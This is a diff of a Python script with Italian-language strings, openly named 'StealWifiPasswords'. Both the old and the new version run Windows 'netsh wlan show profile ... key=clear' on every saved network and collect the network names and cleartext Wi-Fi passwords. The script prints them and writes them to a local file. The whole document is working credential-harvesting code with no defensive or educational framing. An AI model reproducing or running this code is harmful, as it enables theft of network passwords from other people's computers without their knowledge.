@@ -1,73 +1,52 @@
-
-# Import modules
+#!/usr/bin/python
 import re 
-import subprocess
+import subprocess,sys
 
+def StealWifiPasswords_mio():
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
+    profiles=[]
+    for i in data:
+        if "Tutti i profili utente" in i:
+            profile=i.split(":")[1][1:-1]
+            profiles.append(profile)
+        elif "All User Profile" in i:
+            profile=i.split(":")[1][1:-1]
+            profiles.append(profile)
 
-""" Get wifi auth credentials """
-def StealWifiPasswords():
-    try:
-        result = []
-        chcp = f"chcp 65001 && "
-        # Fetch all networks
-        networks = subprocess.check_output(f"{chcp} netsh wlan show profile", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-        networks = networks.decode(encoding="utf8", errors="strict")
-        network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
-        if network_names_list == []:
-            network_names_list = re.findall("(?: Tutti i profili utente\s*:\s)(.*)", networks)
+    lunghezza=len(profiles)
+    print(lunghezza)
+    c=0 
+    for i in profiles:
+        try:
+            Results=[]
+            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
+            for b in results:
+                if "Contenuto chiave" in b:
+                    results=b.split(":")[1][1:-1]
+                    Results.append(results)
+                elif "Key Content" in b:
+                    results=b.split(":")[1][1:-1]
+                    Results.append(results)
+            try:
+	            print ("Nome rete wifi: {:<30} | Password wifi: {:<}".format(i, Results[0]))
+	            with open("output_file_wifi.txt", "a+") as file:
+	            	file.write(str("Nome rete wifi: {:<30} | Password wifi: {:<}".format(i, Results[0])))
+	            	file.write("\n")
+	            c=c+1
+	            if(c==lunghezza):
+	            	sys.exit(0)
+            
+            except IndexError:
+	            print ("{:<30}|  {:<}".format(i, ""))
         
-        print(network_names_list)
-        # For all found networks
-        for network_name in network_names_list:
-            current_result = subprocess.check_output(f"{chcp}netsh wlan show profile {network_name} key=clear", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-            current_result = current_result.decode(encoding="utf8", errors="strict")      
-            # Fetch wifi credentials
-            
-            try:
-            	ssid = re.findall("(?:Nome SSID\s*:\s)(.*)", str(current_result))[0].replace("\r", '').replace("\"", '')
-                
-            except IndexError:
-            	ssid = re.findall("(?:SSID Name\s*:\s)(.*)", str(current_result))[0].replace("\r", '').replace("\"", '')
-           
-            try:
-                authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)[0].replace("\r", '')
-            
-            except IndexError:
-            	authentication = re.findall(r"(?:Autenticazione\s*:\s)(.*)", current_result)[0].replace("\r", '')
-           
-            try:
-                cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)[0].replace("\r", '')
-            except IndexError:
-            	cipher = re.findall("(?:Crittografia\s*:\s)(.*)", current_result)[0].replace("\r", '')
-           
-            try:
-                security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)[0].replace("\r", '')
-            
-            except IndexError:
-            	security_key = re.findall(r"(?:Chiave di sicurezza\s*:\s)(.*)", current_result)[0].replace("\r", '')
-           
-            try:
-                password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)[0].replace("\r", '')
-            except IndexError:
-                password = re.findall("(?:Contenuto chiave\s*:\s)(.*)", current_result)[0].replace("\r", '')
-            # Save
-            wifi = {
-                "SSID": ssid,
-                "AUTH": authentication,
-                "CIPHER": cipher,
-                "SECURITY_KEY": security_key,
-                "PASSWORD": password
-            }
-            result.append(wifi)
-            print(wifi)
-        
-            with open("output_file_wifi.txt", "w") as file:
-                file.write(str(wifi))
-                file.write("\n")
-
-        return result
-    except subprocess.CalledProcessError as e:
-        pass
+        except subprocess.CalledProcessError:
+	        print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
+	        with open("output_file_wifi.txt", "w") as file:
+	        	file.write("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
+	        	file.write("\n")
+    
+    input("")
 
 
-StealWifiPasswords()
+
+StealWifiPasswords_mio()
